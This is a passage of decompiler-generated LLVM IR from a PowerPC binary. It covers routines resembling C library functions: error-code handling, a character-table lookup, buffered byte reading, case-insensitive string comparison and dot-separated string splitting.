  uselistorder i32 32, { 55, 56, 57, 29, 58, 59, 30, 60, 61, 62, 63, 18, 19, 64, 65, 43, 14, 28, 44, 54, 15, 16, 39, 40, 38, 2, 3, 4, 17, 13, 45, 46, 31, 47, 48, 49, 50, 51, 52, 53, 0, 66, 67, 24, 23, 1, 22, 41, 25, 32, 42, 33, 6, 5, 8, 20, 7, 34, 35, 10, 21, 9, 36, 26, 27, 12, 11, 37 }
  uselistorder i32* @r10, { 1, 2, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10014040, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10014010, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1001400c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013fc8, { 1, 0 }
  uselistorder label %dec_label_pc_10013fc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013f9c, { 1, 0 }
  uselistorder label %dec_label_pc_10013f5c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10013eec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10013f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10013ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10013ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10013e8c, { 1, 0 }
  uselistorder label %dec_label_pc_10013df4, { 1, 0 }
  uselistorder label %dec_label_pc_10013d88, { 1, 0 }
}

define i32 @function_10014058(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014058:
  %v0_1001405c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268517488, i32* @lr, align 4
  %v0_1001406c = call i32 @function_1000c44c()
  %v0_10014074 = load i32, i32* @r29, align 4
  store i32 %v0_1001405c, i32* @lr, align 4
  %v2_10014084 = call i32 @function_1000c4dc(i32 %v0_1001406c, i32 %v0_10014074)
  ret i32 %v2_10014084

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_1000c4dc, { 2, 0, 1 }
  uselistorder i32 ()* @function_1000c44c, { 0, 3, 2, 1 }
}

define i32 @function_10014088(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10014088:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001408c = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_100140b4 = call i32 @__asm_mfcr()
  %v1_100140b8 = and i32 %v0_100140b4, 268435456
  %v3_100140b8 = icmp eq i32 %v1_100140b8, 0
  store i32 %v0_100140b4, i32* %r31.global-to-local, align 4
  store i32 %v0_100140b4, i32* %r0.global-to-local, align 4
  br i1 %v3_100140b8, label %dec_label_pc_100140dc, label %dec_label_pc_100140cc

dec_label_pc_100140cc:                            ; preds = %dec_label_pc_10014088
  %v0_100140cc = call i32 @function_1000c85c()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_100140d4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100140d4 = inttoptr i32 %v0_100140cc to i32*
  store i32 %v0_100140d4, i32* %v2_100140d4, align 4
  %v0_100140e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100140e0

dec_label_pc_100140dc:                            ; preds = %dec_label_pc_10014088
  %v3_100140c4 = icmp eq i32 %v0_100140b4, 0
  br i1 %v3_100140c4, label %dec_label_pc_100140ec, label %dec_label_pc_100140e0

dec_label_pc_100140e0:                            ; preds = %dec_label_pc_100140dc, %dec_label_pc_100140cc
  %v0_100140e0 = phi i32 [ %v0_100140b4, %dec_label_pc_100140dc ], [ %v0_100140e0.pre, %dec_label_pc_100140cc ]
  %tmp = icmp slt i32 %v0_100140e0, 0
  %v1_100140e4 = zext i1 %tmp to i32
  %v2_100140e4 = ashr i32 %v0_100140e0, 31
  %v3_100140e4 = and i32 %v2_100140e4, -2
  %v4_100140e4 = or i32 %v3_100140e4, %v1_100140e4
  br label %dec_label_pc_100140f4

dec_label_pc_100140ec:                            ; preds = %dec_label_pc_100140dc
  %v3_100140ec = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100140f4

dec_label_pc_100140f4:                            ; preds = %dec_label_pc_100140e0, %dec_label_pc_100140ec
  %v0_10014104 = phi i32 [ %v4_100140e4, %dec_label_pc_100140e0 ], [ %v3_100140ec, %dec_label_pc_100140ec ]
  store i32 %v0_1001408c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014104

; uselistorder directives
  uselistorder i32 %v0_100140e0, { 1, 0 }
  uselistorder i32 %v0_100140b4, { 0, 3, 2, 1, 4 }
  uselistorder i32 31, { 11, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 12, 13, 1, 2, 43, 44, 14, 28, 29, 8, 9, 3, 4, 0, 6, 5, 15, 16, 17, 47, 48, 45, 46, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 7, 10, 30, 31 }
  uselistorder i32 268435456, { 7, 14, 19, 8, 4, 22, 23, 24, 25, 16, 21, 5, 20, 0, 12, 13, 1, 9, 27, 17, 10, 18, 30, 6, 11, 15, 2, 3, 26, 28, 29, 31 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100140f4, { 1, 0 }
}

define i32 @function_10014108(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014108:
  %v1_10014108 = add i32 %arg1, 128
  %v1_1001410c = mul i32 %arg1, 2
  %v2_10014110 = icmp ugt i32 %v1_10014108, 383
  %v0_10014114 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10014110, i32 %v0_10014114)
  %v3_1001411c = load i32, i32* bitcast (i32** @global_var_1002b8f4.734 to i32*), align 4
  %v2_10014120 = add i32 %v1_1001410c, %v3_1001411c
  %v3_10014120 = inttoptr i32 %v2_10014120 to i16*
  %v4_10014120 = load i16, i16* %v3_10014120, align 2
  %v5_10014120 = sext i16 %v4_10014120 to i32
  ret i32 %v5_10014120

; uselistorder directives
  uselistorder i32 383, { 1, 0 }
}

define i32 @function_10014128(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10014128:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1001412c = load i32, i32* @lr, align 4
  store i32 %v0_1001412c, i32* %r0.global-to-local, align 4
  %v0_10014130 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1001413c = add i32 %tmp, 16
  %v3_1001413c = inttoptr i32 %v2_1001413c to i32*
  %v4_1001413c = load i32, i32* %v3_1001413c, align 4
  store i32 %v4_1001413c, i32* %r9.global-to-local, align 4
  %v2_10014140 = add i32 %tmp, 24
  %v3_10014140 = inttoptr i32 %v2_10014140 to i32*
  %v4_10014140 = load i32, i32* %v3_10014140, align 4
  store i32 %v4_10014140, i32* %r0.global-to-local, align 4
  %v2_10014144 = icmp ult i32 %v4_1001413c, %v4_10014140
  br i1 %v2_10014144, label %dec_label_pc_100141ac, label %dec_label_pc_1001414c

dec_label_pc_1001414c:                            ; preds = %dec_label_pc_10014128
  %v3_1001414c = load i16, i16* %arg1, align 2
  %v4_1001414c = zext i16 %v3_1001414c to i32
  %v1_10014150 = and i32 %v4_1001414c, 131
  store i32 %v1_10014150, i32* %r0.global-to-local, align 4
  %v2_10014154 = icmp ugt i32 %v1_10014150, 128
  br i1 %v2_10014154, label %dec_label_pc_1001416c, label %dec_label_pc_1001415c

dec_label_pc_1001415c:                            ; preds = %dec_label_pc_1001414c
  store i32 268517732, i32* @lr, align 4
  %v3_10014160 = call i32 @function_10014574(i16* inttoptr (i32 128 to i16*), i32 %v4_1001413c)
  store i32 %v3_10014160, i32* %r3.global-to-local, align 4
  %v3_10014164 = icmp eq i32 %v3_10014160, 0
  br i1 %v3_10014164, label %dec_label_pc_1001415c.dec_label_pc_1001416c_crit_edge, label %dec_label_pc_10014248

dec_label_pc_1001415c.dec_label_pc_1001416c_crit_edge: ; preds = %dec_label_pc_1001415c
  %v0_1001416c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001416c

dec_label_pc_1001416c:                            ; preds = %dec_label_pc_1001415c.dec_label_pc_1001416c_crit_edge, %dec_label_pc_1001414c
  %v2_100141cc = phi i32 [ %v0_1001416c.pre, %dec_label_pc_1001415c.dec_label_pc_1001416c_crit_edge ], [ %tmp, %dec_label_pc_1001414c ]
  %v1_1001416c = inttoptr i32 %v2_100141cc to i16*
  %v2_1001416c = load i16, i16* %v1_1001416c, align 2
  %v3_1001416c = zext i16 %v2_1001416c to i32
  %v1_10014170 = and i32 %v3_1001416c, 2
  store i32 %v1_10014170, i32* %r0.global-to-local, align 4
  %v3_10014170 = icmp eq i32 %v1_10014170, 0
  br i1 %v3_10014170, label %dec_label_pc_1001419c, label %dec_label_pc_10014178

dec_label_pc_10014178:                            ; preds = %dec_label_pc_1001416c
  %v1_10014178 = call i32 @__asm_rlwinm(i32 %v3_1001416c, i32 2, i32 29, i32 29)
  %v1_1001417c = load i32, i32* @r31, align 4
  %v2_1001417c = add i32 %v1_1001417c, %v1_10014178
  store i32 %v2_1001417c, i32* %r9.global-to-local, align 4
  %v1_10014180 = add i32 %v2_1001417c, 39
  %v2_10014180 = inttoptr i32 %v1_10014180 to i8*
  %v3_10014180 = load i8, i8* %v2_10014180, align 1
  %v4_10014180 = zext i8 %v3_10014180 to i32
  store i32 %v4_10014180, i32* %r0.global-to-local, align 4
  %v1_10014184 = add nsw i32 %v3_1001416c, -1
  store i32 %v1_10014184, i32* %r9.global-to-local, align 4
  %v1_10014188 = trunc i32 %v1_10014184 to i16
  %v3_10014188 = inttoptr i32 %v1_1001417c to i16*
  store i16 %v1_10014188, i16* %v3_10014188, align 2
  %v0_1001418c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1001418c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014194 = load i32, i32* @r31, align 4
  %v2_10014194 = add i32 %v1_10014194, 40
  %v3_10014194 = inttoptr i32 %v2_10014194 to i32*
  store i32 0, i32* %v3_10014194, align 4
  br label %dec_label_pc_1001424c

dec_label_pc_1001419c:                            ; preds = %dec_label_pc_1001416c
  %v1_1001419c = add i32 %v2_100141cc, 16
  %v2_1001419c = inttoptr i32 %v1_1001419c to i32*
  %v3_1001419c = load i32, i32* %v2_1001419c, align 4
  store i32 %v3_1001419c, i32* %r9.global-to-local, align 4
  %v1_100141a0 = add i32 %v2_100141cc, 20
  %v2_100141a0 = inttoptr i32 %v1_100141a0 to i32*
  %v3_100141a0 = load i32, i32* %v2_100141a0, align 4
  store i32 %v3_100141a0, i32* %r0.global-to-local, align 4
  %v4_100141a4 = icmp eq i32 %v3_100141a0, %v3_1001419c
  br i1 %v4_100141a4, label %dec_label_pc_100141b8, label %dec_label_pc_100141ac

dec_label_pc_100141ac:                            ; preds = %dec_label_pc_1001419c, %dec_label_pc_10014128
  %v1_100142207 = phi i32 [ %v2_100141cc, %dec_label_pc_1001419c ], [ %tmp, %dec_label_pc_10014128 ]
  %v0_100141ac = phi i32 [ %v3_1001419c, %dec_label_pc_1001419c ], [ %v4_1001413c, %dec_label_pc_10014128 ]
  %v1_100141ac = inttoptr i32 %v0_100141ac to i8*
  %v2_100141ac = load i8, i8* %v1_100141ac, align 1
  %v3_100141ac = zext i8 %v2_100141ac to i32
  store i32 %v3_100141ac, i32* %r3.global-to-local, align 4
  %v1_100141b0 = add i32 %v0_100141ac, 1
  store i32 %v1_100141b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10014220

dec_label_pc_100141b8:                            ; preds = %dec_label_pc_1001419c
  %v1_100141b8 = add i32 %v2_100141cc, 4
  %v2_100141b8 = inttoptr i32 %v1_100141b8 to i32*
  %v3_100141b8 = load i32, i32* %v2_100141b8, align 4
  store i32 %v3_100141b8, i32* %r0.global-to-local, align 4
  %v3_100141bc = icmp eq i32 %v3_100141b8, -2
  br i1 %v3_100141bc, label %dec_label_pc_100141c4, label %dec_label_pc_100141d4

dec_label_pc_100141c4:                            ; preds = %dec_label_pc_100141b8
  %v1_100141c4 = or i32 %v3_1001416c, 4
  store i32 %v1_100141c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100141cc = trunc i32 %v1_100141c4 to i16
  store i16 %v1_100141cc, i16* %v1_1001416c, align 2
  br label %dec_label_pc_1001424c

dec_label_pc_100141d4:                            ; preds = %dec_label_pc_100141b8
  %v1_100141d4 = and i32 %v3_1001416c, 768
  store i32 %v1_100141d4, i32* %r0.global-to-local, align 4
  %v3_100141d4 = icmp eq i32 %v1_100141d4, 0
  br i1 %v3_100141d4, label %dec_label_pc_100141e8, label %dec_label_pc_100141dc

dec_label_pc_100141dc:                            ; preds = %dec_label_pc_100141d4
  store i32 ptrtoint (i32** @global_var_1002b8e0.712 to i32), i32* %r3.global-to-local, align 4
  store i32 268517864, i32* @lr, align 4
  %v4_100141e4 = call i32 @function_10012de8(i16* bitcast (i32** @global_var_1002b8e0.712 to i16*), i32 %v3_1001419c)
  store i32 %v4_100141e4, i32* %r3.global-to-local, align 4
  %v0_100141e8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100141e8

dec_label_pc_100141e8:                            ; preds = %dec_label_pc_100141d4, %dec_label_pc_100141dc
  %v0_10014228 = phi i32 [ %v2_100141cc, %dec_label_pc_100141d4 ], [ %v0_100141e8.pre, %dec_label_pc_100141dc ]
  %v1_100141e8 = add i32 %v0_10014228, 8
  %v2_100141e8 = inttoptr i32 %v1_100141e8 to i32*
  %v3_100141e8 = load i32, i32* %v2_100141e8, align 4
  store i32 %v3_100141e8, i32* %r9.global-to-local, align 4
  %v1_100141ec = add i32 %v0_10014228, 12
  %v2_100141ec = inttoptr i32 %v1_100141ec to i32*
  %v3_100141ec = load i32, i32* %v2_100141ec, align 4
  store i32 %v3_100141ec, i32* %r0.global-to-local, align 4
  %v4_100141f0 = icmp eq i32 %v3_100141ec, %v3_100141e8
  br i1 %v4_100141f0, label %dec_label_pc_10014228, label %dec_label_pc_100141f8

dec_label_pc_100141f8:                            ; preds = %dec_label_pc_100141e8
  %v2_100141f8 = add i32 %v0_10014228, 24
  %v3_100141f8 = inttoptr i32 %v2_100141f8 to i32*
  store i32 %v3_100141e8, i32* %v3_100141f8, align 4
  %v0_100141fc = load i32, i32* @r31, align 4
  store i32 %v0_100141fc, i32* %r3.global-to-local, align 4
  store i32 268517892, i32* @lr, align 4
  %v3_10014200 = call i32 @function_1001452c(i32 %v0_100141fc, i32 %v3_100141e8)
  store i32 %v3_10014200, i32* %r3.global-to-local, align 4
  %v3_10014204 = icmp eq i32 %v3_10014200, 0
  br i1 %v3_10014204, label %dec_label_pc_10014248, label %dec_label_pc_1001420c

dec_label_pc_1001420c:                            ; preds = %dec_label_pc_100141f8
  %v0_1001420c = load i32, i32* @r31, align 4
  %v1_1001420c = add i32 %v0_1001420c, 20
  %v2_1001420c = inttoptr i32 %v1_1001420c to i32*
  %v3_1001420c = load i32, i32* %v2_1001420c, align 4
  store i32 %v3_1001420c, i32* %r0.global-to-local, align 4
  %v1_10014210 = add i32 %v0_1001420c, 16
  %v2_10014210 = inttoptr i32 %v1_10014210 to i32*
  %v3_10014210 = load i32, i32* %v2_10014210, align 4
  store i32 %v3_10014210, i32* %r9.global-to-local, align 4
  %v2_10014214 = add i32 %v0_1001420c, 24
  %v3_10014214 = inttoptr i32 %v2_10014214 to i32*
  store i32 %v3_1001420c, i32* %v3_10014214, align 4
  %v0_10014218 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014218 = add i32 %v0_10014218, 1
  store i32 %v1_10014218, i32* %r0.global-to-local, align 4
  %v1_1001421c = inttoptr i32 %v0_10014218 to i8*
  %v2_1001421c = load i8, i8* %v1_1001421c, align 1
  %v3_1001421c = zext i8 %v2_1001421c to i32
  store i32 %v3_1001421c, i32* %r3.global-to-local, align 4
  %v1_10014220.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014220

dec_label_pc_10014220:                            ; preds = %dec_label_pc_100141ac, %dec_label_pc_1001420c
  %v1_10014220 = phi i32 [ %v1_100142207, %dec_label_pc_100141ac ], [ %v1_10014220.pre, %dec_label_pc_1001420c ]
  %v0_10014220 = phi i32 [ %v1_100141b0, %dec_label_pc_100141ac ], [ %v1_10014218, %dec_label_pc_1001420c ]
  %v2_10014220 = add i32 %v1_10014220, 16
  %v3_10014220 = inttoptr i32 %v2_10014220 to i32*
  store i32 %v0_10014220, i32* %v3_10014220, align 4
  br label %dec_label_pc_1001424c

dec_label_pc_10014228:                            ; preds = %dec_label_pc_100141e8
  %v1_10014228 = inttoptr i32 %v0_10014228 to i16*
  store i32 %v0_10014228, i32* %r3.global-to-local, align 4
  %v2_1001422c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268517944, i32* @lr, align 4
  %v5_10014234 = call i32 @function_100144b8(i16* %v1_10014228, i32 %v2_1001422c, i32 1)
  store i32 %v5_10014234, i32* %r3.global-to-local, align 4
  %v3_10014238 = icmp eq i32 %v5_10014234, 0
  br i1 %v3_10014238, label %dec_label_pc_10014248, label %dec_label_pc_10014240

dec_label_pc_10014240:                            ; preds = %dec_label_pc_10014228
  %v3_10014240 = load i8, i8* %stack_var_-24, align 1
  %v4_10014240 = sext i8 %v3_10014240 to i32
  store i32 %v4_10014240, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001424c

dec_label_pc_10014248:                            ; preds = %dec_label_pc_1001415c, %dec_label_pc_10014228, %dec_label_pc_100141f8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001424c

dec_label_pc_1001424c:                            ; preds = %dec_label_pc_10014240, %dec_label_pc_10014220, %dec_label_pc_100141c4, %dec_label_pc_10014178, %dec_label_pc_10014248
  store i32 %v0_1001412c, i32* %r0.global-to-local, align 4
  store i32 %v0_10014130, i32* @r31, align 4
  %v0_1001425c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001425c

; uselistorder directives
  uselistorder i32 %v3_100141e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10014228, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_100141ac, { 1, 0 }
  uselistorder i32 %v3_1001419c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1001417c, { 1, 0 }
  uselistorder i32 %v3_1001416c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_100141cc, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 13, 3, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 14, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* @global_var_1002b5a4.703, { 2, 1, 0, 3 }
  uselistorder i32 -2, { 21, 9, 10, 11, 2, 3, 5, 12, 13, 7, 1, 0, 14, 15, 16, 18, 19, 17, 20, 6, 8, 4 }
  uselistorder i32 40, { 9, 10, 11, 3, 12, 0, 4, 5, 6, 7, 8, 1, 2 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 29, { 6, 7, 8, 11, 12, 5, 9, 10, 0, 1, 13, 14, 2, 3, 17, 18, 15, 16, 4 }
  uselistorder i32 128, { 6, 21, 22, 0, 1, 23, 24, 5, 19, 3, 7, 8, 12, 13, 14, 4, 15, 9, 16, 17, 18, 2, 10, 20, 11 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_1001424c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10014248, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10014220, { 1, 0 }
  uselistorder label %dec_label_pc_100141e8, { 1, 0 }
}

define i32 @function_10014260(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10014260:
  %v3_10014264 = load i32, i32* bitcast (i32** @global_var_1002b8f4.734 to i32*), align 4
  %v0_1001426c.pre = load i32, i32* @r3, align 4
  %v1_1001426c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001426c

dec_label_pc_1001426c:                            ; preds = %dec_label_pc_10014294, %dec_label_pc_10014260
  %v0_100142a86 = phi i32 [ %v0_100142a87, %dec_label_pc_10014294 ], [ 0, %dec_label_pc_10014260 ]
  %v0_10014298 = phi i32 [ %v1_10014298, %dec_label_pc_10014294 ], [ %v1_1001426c.pre, %dec_label_pc_10014260 ]
  %v0_1001429c = phi i32 [ %v1_1001429c, %dec_label_pc_10014294 ], [ %v0_1001426c.pre, %dec_label_pc_10014260 ]
  %v4_1001426c = icmp eq i32 %v0_1001429c, %v0_10014298
  %.pre = inttoptr i32 %v0_1001429c to i8*
  br i1 %v4_1001426c, label %dec_label_pc_10014294, label %dec_label_pc_10014274

dec_label_pc_10014274:                            ; preds = %dec_label_pc_1001426c
  %v2_10014274 = load i8, i8* %.pre, align 1
  %v3_10014274 = zext i8 %v2_10014274 to i32
  %v1_10014278 = inttoptr i32 %v0_10014298 to i8*
  %v2_10014278 = load i8, i8* %v1_10014278, align 1
  %v3_10014278 = zext i8 %v2_10014278 to i32
  %v1_1001427c = mul nuw nsw i32 %v3_10014274, 2
  %v1_10014280 = mul nuw nsw i32 %v3_10014278, 2
  %v2_10014284 = add i32 %v1_1001427c, %v3_10014264
  %v3_10014284 = inttoptr i32 %v2_10014284 to i16*
  %v4_10014284 = load i16, i16* %v3_10014284, align 2
  %v5_10014284 = sext i16 %v4_10014284 to i32
  %v2_10014288 = add i32 %v1_10014280, %v3_10014264
  %v3_10014288 = inttoptr i32 %v2_10014288 to i16*
  %v4_10014288 = load i16, i16* %v3_10014288, align 2
  %v5_10014288 = sext i16 %v4_10014288 to i32
  %v2_1001428c = sub nsw i32 %v5_10014284, %v5_10014288
  %v4_10014290 = icmp eq i16 %v4_10014284, %v4_10014288
  br i1 %v4_10014290, label %dec_label_pc_10014294, label %dec_label_pc_100142a8

dec_label_pc_10014294:                            ; preds = %dec_label_pc_1001426c, %dec_label_pc_10014274
  %v0_100142a87 = phi i32 [ %v2_1001428c, %dec_label_pc_10014274 ], [ %v0_100142a86, %dec_label_pc_1001426c ]
  %v2_10014294 = load i8, i8* %.pre, align 1
  %v1_10014298 = add i32 %v0_10014298, 1
  %v1_1001429c = add i32 %v0_1001429c, 1
  %v3_100142a0 = icmp eq i8 %v2_10014294, 0
  br i1 %v3_100142a0, label %dec_label_pc_100142a8, label %dec_label_pc_1001426c

dec_label_pc_100142a8:                            ; preds = %dec_label_pc_10014294, %dec_label_pc_10014274
  %v0_100142a8 = phi i32 [ %v0_100142a87, %dec_label_pc_10014294 ], [ %v2_1001428c, %dec_label_pc_10014274 ]
  ret i32 %v0_100142a8

; uselistorder directives
  uselistorder i32 %v2_1001428c, { 1, 0 }
  uselistorder i32 %v0_1001429c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014294, { 1, 0 }
}

define i32 @function_100142b0(i8* %arg1) local_unnamed_addr {
dec_label_pc_100142b0:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100142b4 = load i32, i32* @lr, align 4
  store i32 %v0_100142b4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_100142c0 = load i32, i32* @r4, align 4
  store i32 %v0_100142c0, i32* @r29, align 4
  %v0_100142c4 = load i32, i32* @r5, align 4
  store i32 %v0_100142c4, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001433013 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001433013, label %dec_label_pc_1001434c, label %dec_label_pc_10014340

dec_label_pc_100142d4:                            ; preds = %dec_label_pc_10014340
  store i32 268518104, i32* @lr, align 4
  %v3_100142d4 = call i32 @function_1000de0c(i32 %v0_1001434014, i32 46)
  store i32 %v3_100142d4, i32* @r30, align 4
  %v3_100142d8 = icmp eq i32 %v3_100142d4, 0
  %v0_100142dc = load i32, i32* @r31, align 4
  store i32 %v0_100142dc, i32* @r3, align 4
  %v2_100142e0 = sub i32 %v3_100142d4, %v0_100142dc
  store i32 %v2_100142e0, i32* %r0.global-to-local, align 4
  br i1 %v3_100142d8, label %dec_label_pc_100142e8, label %dec_label_pc_100142f0

dec_label_pc_100142e8:                            ; preds = %dec_label_pc_100142d4
  %v0_100142e8 = call i32 @function_1000df60()
  store i32 %v0_100142e8, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_100142e8, 16777216
  %v1_100142ec = sdiv i32 %sext, 16777216
  store i32 %v1_100142ec, i32* %r0.global-to-local, align 4
  %v0_10014300.pre = load i32, i32* @r31, align 4
  %v0_10014310.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100142f0

dec_label_pc_100142f0:                            ; preds = %dec_label_pc_100142d4, %dec_label_pc_100142e8
  %v0_10014310 = phi i32 [ %v3_100142d4, %dec_label_pc_100142d4 ], [ %v0_10014310.pre, %dec_label_pc_100142e8 ]
  %v0_10014300 = phi i32 [ %v0_100142dc, %dec_label_pc_100142d4 ], [ %v0_10014300.pre, %dec_label_pc_100142e8 ]
  %v0_1001431c = phi i32 [ %v2_100142e0, %dec_label_pc_100142d4 ], [ %v1_100142ec, %dec_label_pc_100142e8 ]
  %v0_100142f0 = load i32, i32* @r28, align 4
  %v1_100142f0 = load i32, i32* %r27.global-to-local, align 4
  %v2_100142f0 = sub i32 %v1_100142f0, %v0_100142f0
  %v1_100142f8 = add i32 %v0_100142f0, 1
  store i32 %v1_100142f8, i32* %r11.global-to-local, align 4
  %v1_100142fc = add i32 %v2_100142f0, -1
  store i32 %v0_10014300, i32* @r4, align 4
  %v0_10014304 = load i32, i32* @r29, align 4
  %v2_10014304 = add i32 %v0_10014304, %v1_100142f8
  store i32 %v2_10014304, i32* @r3, align 4
  store i32 %v0_1001431c, i32* @r5, align 4
  %v2_1001430c = icmp ult i32 %v0_1001431c, %v1_100142fc
  %v1_10014310 = add i32 %v0_10014310, 1
  store i32 %v1_10014310, i32* @r31, align 4
  %v3_100142f4.not = icmp ne i32 %v0_1001431c, 0
  %or.cond = and i1 %v2_1001430c, %v3_100142f4.not
  br i1 %or.cond, label %dec_label_pc_1001431c, label %dec_label_pc_10014364

dec_label_pc_1001431c:                            ; preds = %dec_label_pc_100142f0
  %v3_1001431c = trunc i32 %v0_1001431c to i8
  %v4_1001431c = add i32 %v0_10014304, %v0_100142f0
  %v5_1001431c = inttoptr i32 %v4_1001431c to i8*
  store i8 %v3_1001431c, i8* %v5_1001431c, align 1
  %v0_10014320 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014320 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014320 = add i32 %v1_10014320, %v0_10014320
  store i32 %v2_10014320, i32* @r28, align 4
  store i32 268518184, i32* @lr, align 4
  %v0_10014324 = call i32 @function_1000dcb0()
  store i32 %v0_10014324, i32* %r3.global-to-local, align 4
  %v0_10014328 = load i32, i32* @r30, align 4
  %v3_10014328 = icmp eq i32 %v0_10014328, 0
  br i1 %v3_10014328, label %dec_label_pc_1001434c, label %dec_label_pc_1001431c.dec_label_pc_10014330_crit_edge

dec_label_pc_1001431c.dec_label_pc_10014330_crit_edge: ; preds = %dec_label_pc_1001431c
  %v0_10014330.pre = load i32, i32* @r31, align 4
  %v3_10014330 = icmp eq i32 %v0_10014330.pre, 0
  store i32 %v0_10014330.pre, i32* @r3, align 4
  br i1 %v3_10014330, label %dec_label_pc_1001434c, label %dec_label_pc_10014340

dec_label_pc_10014340:                            ; preds = %dec_label_pc_100142b0, %dec_label_pc_1001431c.dec_label_pc_10014330_crit_edge
  %v0_1001434014 = phi i32 [ %v0_10014330.pre, %dec_label_pc_1001431c.dec_label_pc_10014330_crit_edge ], [ %tmp, %dec_label_pc_100142b0 ]
  %v1_10014340 = inttoptr i32 %v0_1001434014 to i8*
  %v2_10014340 = load i8, i8* %v1_10014340, align 1
  %v3_10014340 = zext i8 %v2_10014340 to i32
  store i32 %v3_10014340, i32* %r0.global-to-local, align 4
  %v3_10014344 = icmp eq i8 %v2_10014340, 0
  br i1 %v3_10014344, label %dec_label_pc_1001434c, label %dec_label_pc_100142d4

dec_label_pc_1001434c:                            ; preds = %dec_label_pc_1001431c.dec_label_pc_10014330_crit_edge, %dec_label_pc_1001431c, %dec_label_pc_10014340, %dec_label_pc_100142b0
  %v0_1001434c = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1001434c, 1
  br i1 %tmp10, label %dec_label_pc_10014364, label %dec_label_pc_10014354

dec_label_pc_10014354:                            ; preds = %dec_label_pc_1001434c
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014358 = load i32, i32* @r28, align 4
  %v1_10014358 = add i32 %v0_10014358, 1
  store i32 %v1_10014358, i32* %r3.global-to-local, align 4
  %v1_1001435c = load i32, i32* @r29, align 4
  %v4_1001435c = add i32 %v1_1001435c, %v0_10014358
  %v5_1001435c = inttoptr i32 %v4_1001435c to i8*
  store i8 0, i8* %v5_1001435c, align 1
